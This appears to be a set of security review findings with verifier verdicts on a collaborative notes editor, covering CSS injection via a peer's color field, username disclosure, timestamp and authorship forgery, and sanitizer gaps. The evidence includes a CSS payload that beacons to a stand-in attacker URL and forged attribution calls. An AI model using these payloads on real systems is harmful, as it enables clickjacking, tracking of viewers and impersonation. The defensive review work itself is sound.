samples.summary: Peer-controlled `color` is interpolated raw into a `style` attribute (CSS injection), in the same function the diff hardens for `name`
samples.evidence: The diff sanitizes the self-reported presence `name` at remote-selection.ts:175 (`sanitizeDisplayName(peer.name)`) and states that both render paths now "share one guarantee" for unverified presence data. The sibling untrusted presence field on the very same object is still interpolated verbatim into an attribute string: `attributes: { style: `background-color: ${peer.color}` }` (remote-selection.ts:146). `peer.color` comes from `NotesPresence.color` (packages/frontend/src/types/notes-document.ts:35), a free-form string each client sets for itself; the backend never validates presence (yorkie-auth.controller.ts authorizes docKey+verb only) and Yorkie validates nothing inside a change. Vector: a co-editor (or an anonymous share-link editor, role `editor` per yorkie-auth.controller.ts:200) attaches with `color: "red; position:fixed; inset:0; width:100vw; height:100vh; z-index:99999; background-image:url(https://attacker/beacon)"`. CodeMirror passes the attribute map to `setAttribute('style', ...)`, so every declaration applies on every other viewer's screen: full-viewport overlay (UI spoofing / clickjacking over the editor) plus an outbound request that discloses each viewer's IP/UA to the attacker. Not XSS (attribute, not HTML), but arbitrary attacker CSS in another user's document view. Only occurrence of this template in the repo (grep `background-color: \$\{`). The line predates the diff, but the diff is exactly the change that audits this data flow and it stops one field short; `peer.color` is also used safely two lines away via `span.style.backgroundColor = this.color` (line 61), which shows the safe form.

samples.summary: Editor usernames are now permanently persisted into note content and disclosed to every reader (incl. viewer-role share links), with recording unconditional and no opt-out
samples.evidence: `editText` unconditionally stamps `{ a: <presence name>, t: Date.now() }` on every inserted run (yorkie-note-store.ts:145-151). The presence `name` is the authenticated user's username (notes-detail.tsx:259 `name: currentUser.username`). The `showAuthors` preference added by this change is display-only and per-reader (notes-settings.ts / notes-view.tsx): a user who never enables the gutter still has their username written into the CRDT on every keystroke, and there is no setting that stops recording. Because the attributes live inside `root.content`, they are part of the document snapshot delivered to ANY principal with read access — including an anonymous viewer-role share-link visitor, who is granted read by yorkie-auth.controller.ts:200 (`return needWrite ? link.role === 'editor' : true`) and whose UI (SharedNotesLayout, shared-document.tsx:322-348) never surfaces the gutter but whose client still receives the attributes and can dump them from the console. Before this change a share visitor learned only the identities of users concurrently connected (ephemeral presence); afterwards they learn the username of every past editor of every line, retained indefinitely (docs/design/notes/notes.md: "Retention ... is deliberately unbounded for now"). Confidence is low because presence already leaks username/email of online users to share visitors, so the delta is historical/offline members rather than a wholly new class of data.

samples.summary: The clock-skew bound on the forged `t` attribute does not deliver its documented guarantee: `t = writeTime + 5min` is never discarded and reads as `now` for the whole skew window
samples.evidence: `sanitizeWrittenAt` discards only when `value > now + MAX_CLOCK_SKEW_MS` (line 70) and otherwise returns `Math.min(value, now)` (line 71). A read always happens at R >= the write time T, so a forged `V = T + MAX_CLOCK_SKEW_MS` satisfies `V <= R + MAX_CLOCK_SKEW_MS` for every possible read and is therefore NEVER discarded. For all R in [T, T+5min] the function returns `min(V, R) = R = now`, i.e. the maximum value any span can report on that read, so the forged run strictly outranks every genuine edit on its line in `authorOfRange` (blame-gutter.ts:49); afterwards it is pinned at T+5min, still outranking every genuine edit older than that, and the attacker can simply rewrite the attribute periodically. This contradicts the stated control in the code comment (lines 61-63) and in docs/design/notes/notes.md ("the most it can win is a tie that document order breaks"). Impact is limited because spoofed attribution is already an accepted property of the design, but the mitigation reads as a bound and is not one.

samples.summary: `sanitizeDisplayName` runs two unbounded Unicode-property regex passes over untrusted input before truncating, giving a write-capable peer a cheap client-CPU DoS
samples.evidence: `sanitizeDisplayName` does `.replace(INVISIBLE_RE,'')` then `.replace(UNICODE_SPACE_RE,' ')` over the FULL untrusted value and only then `.slice(0, 64)` (display-name.ts:52-56). The value is an attacker-writable CRDT run attribute: any client with write access can insert a run carrying `a` set to a multi-megabyte string. `YorkieNoteStore.getAuthorSpans()` calls it once per run (yorkie-note-store.ts:180), and `NoteBlameTracker.update` recomputes labels on every `docChanged` (blame-gutter.ts:145-153), so each keystroke re-scans the whole attacker-supplied payload — and `authorOfRange` sanitizes again per line (blame-gutter.ts:56). Slicing to `MAX_DISPLAY_NAME_LENGTH` before the regex passes would bound the work. Severity kept minor because the attacker already needs document write access.

samples.summary: Display-name sanitizer misses combining marks and can emit a lone surrogate, so a spoofed name can still escape its label box
samples.evidence: `INVISIBLE_RE` (display-name.ts:32) strips Cc/Cf/Cs/Co/Zl/Zp plus a hand-listed set, but not non-spacing combining marks (`\p{Mn}`): a 64-character Zalgo name renders as a tall stack. The caret label `.cm-ySelectionInfo` (remote-selection.ts:28-44) sets `whiteSpace: nowrap` but no `overflow`/`max-height`, so an attacker-chosen presence name can paint over surrounding editor UI on every peer's screen (the gutter label is protected by the `overflow: hidden` rule in blame-gutter.ts:195-199; the caret label is not). Separately, `.slice(0, MAX_DISPLAY_NAME_LENGTH)` at line 55 runs on UTF-16 code units after `\p{Cs}` stripping, so cutting exactly between an astral character's surrogates re-introduces the lone surrogate the earlier pass removed, and it is then written back into the CRDT by `editText` (yorkie-note-store.ts:149). Also note homoglyph/confusable impersonation (e.g. Cyrillic 'а' for Latin 'a') is not addressed by this sanitizer, so one collaborator's gutter label can be made visually identical to another's.

verdict.reason: Verified in full. remote-selection.ts:146 interpolates `peer.color` raw into a `style` ATTRIBUTE STRING (`attributes: { style: `background-color: ${peer.color}` }`), which the browser parses as a full declaration list — `;` terminates the declaration and arbitrary further CSS applies. The value is untrusted: yorkie-note-store.ts:433 copies `peer.presence.color` verbatim from `doc.getOthersPresences()` (line 425), and the field is a free-form `string` (notes-document.ts:35) that each client self-reports; `noteUserColor()` is only what an honest client sets for itself. No sanitizer for color exists anywhere in packages/notes/src (grep returns only theme constants, the safe property assignments, and this sink). The backend authorizes only docKey+verb (yorkie-auth.controller.ts:155-168) and grants write to anonymous share-link visitors with role `editor` (line 200) — nothing inspects presence payloads. No application CSP exists (only vendored node_modules matches under .trusted/), so an external `background-image:url()` fires. The contrast the reviewer cites is real: lines 61-62 use CSSOM property setters (`span.style.backgroundColor`), which discard invalid values and cannot smuggle extra declarations, while line 146 does not — and line 174 passes color raw in the very same call where line 175 sanitizes `name`. Impact: attacker-controlled CSS in every other viewer's editor (position:fixed full-viewport overlay for UI spoofing/clickjacking, plus IP/UA disclosure via outbound resource load). In-lane as unsafe input handling reaching an injection sink; major, matching the reviewer's own scoping that this is CSS injection, not XSS. Only immaterial inaccuracy: the auth controller lives at packages/backend/src/document/, not packages/.../notes/.

verdict.reason: Every factual claim checks out in the repo. yorkie-note-store.ts:144-151 unconditionally stamps `{a: <presence name>, t: Date.now()}` on every inserted run, with no role/consent/opt-out gate on the write path; localAuthorName() (:198-206) sources it from presence, and notes-detail.tsx:255-259 sets that presence `name` to the authenticated `currentUser.username`. The `showAuthors` preference is purely a per-reader display toggle (notes-settings.ts:11 localStorage; editor.ts:271,356,388,517-527 only reconfigures gutter compartments) and never gates recording. Because the attributes live inside root.content, they ride the Yorkie snapshot to every principal with read access; yorkie-auth.controller.ts:200 grants read to any valid share token regardless of role (`return needWrite ? link.role === 'editor' : true`), and the shared notes mount (shared-document.tsx:883-896) attaches the same doc without enabling the gutter, so an anonymous viewer-role visitor silently receives usernames of all past editors and can read them from the console. Retention is acknowledged as unbounded (docs/design/notes/notes.md:548-550) and the design doc's trust-boundary section (:567-601) covers only forgery, not disclosure. No guard, no stripping, no unreachability. The only mitigation is that presence already exposes username+email of concurrently-online users to share visitors (shared-document.tsx:838-839), so the delta is offline/historical members — that narrows impact but does not refute the exposure, so I cannot name a refutation ground.

finding.summary: Blame attribution is derived entirely from client-controlled presence with no server-side verification, so any editor can forge another user's authorship
finding.evidence: `localAuthorName()` reads `this.doc.getMyPresence()?.name` (yorkie-note-store.ts:135) — a value the client itself set at attach time (notes-detail.tsx:259, shared-document.tsx:890). Presence content is never validated: I found no server-side check of presence or of `Text` attributes (yorkie-auth.controller.ts only authorizes doc key + verb; yorkie-event.controller.ts has no username/identity handling; note-content.ts ignores attributes). A malicious client with write access — including an *anonymous* share-link visitor, since yorkie-auth.controller.ts:200 grants `rw` to `link.role === 'editor'` with no login — can call `presence.set({ name: 'victim-username' })`, or write the attributes directly as `content.edit(from, to, text, { a: 'victim-username', t: Number.MAX_SAFE_INTEGER })`. Because `authorOfRange` picks the run with the largest `at` (blame-gutter.ts:48) and `t` is a client-supplied `Date.now()`, a forged far-future timestamp lets an attacker permanently own the displayed author of any line they touch by one character — e.g. insert a space into a victim's line, or attribute their own defamatory text to the victim. The gutter presents this as fact ("who last edited each line", editor.ts:122) with no trust indicator; homoglyph/RTL-override or zero-width names sharpen the impersonation (`author.trim() === ''` only catches pure whitespace, blame-gutter.ts:51). Mitigating: docs/design/notes/notes.md explicitly calls blame "a reading aid, not an audit trail" — but that caveat is not surfaced in the UI. Amplifier, pre-existing and out of diff: the auth webhook runs in shadow mode unless `YORKIE_AUTH_WEBHOOK_ENFORCE === 'true'` (yorkie-auth.controller.ts:86-105), so today even the editor-role gate is not enforced.

verdict.reason: Every mitigation the finding says is absent exists in this tree. (1) Far-future timestamp forgery is neutralized: sanitizeWrittenAt (yorkie-note-store.ts:66-72) DISCARDS any `t` > now+5min as unknown (0, losing to every real edit) and clamps in-skew values to now; applied on every read at :181 — so a forged `t` cannot outrank real edits, let alone "permanently own" a line. (2) The claimed `author.trim() === ''` at blame-gutter.ts:51 does not exist; names go through sanitizeDisplayName (blame-gutter.ts:56, yorkie-note-store.ts:149/180), which strips C0/C1 controls, bidi/format chars, lone surrogates, private-use, line/para separators and extra invisibles (Hangul/Khmer/Mongolian/braille fillers), folds Unicode spaces, and caps at 64 chars (display-name.ts:31-56) — the zero-width/RTL impersonation vector is closed. (3) A trust indicator IS surfaced in the UI: blame-gutter.ts:118 sets the hover title to "<name> (self-reported)". (4) The trust boundary is documented in code (yorkie-note-store.ts:21-43) and design (docs/design/notes/notes.md:567-600), and I independently confirmed via grep that getAuthorSpans() is consumed only by the gutter label computation — no authorization or audit path reads it, and the gutter is opt-in/off by default (editor.ts:271,356,388). The residual (a self-reported presence name is unverifiable server-side) is inherent to the pre-existing presence model already used for peer caret labels, never feeds an access decision, is blast-radius-bounded, and is disclosed to the user — not an authorization/secret/injection/crypto defect under this lens.
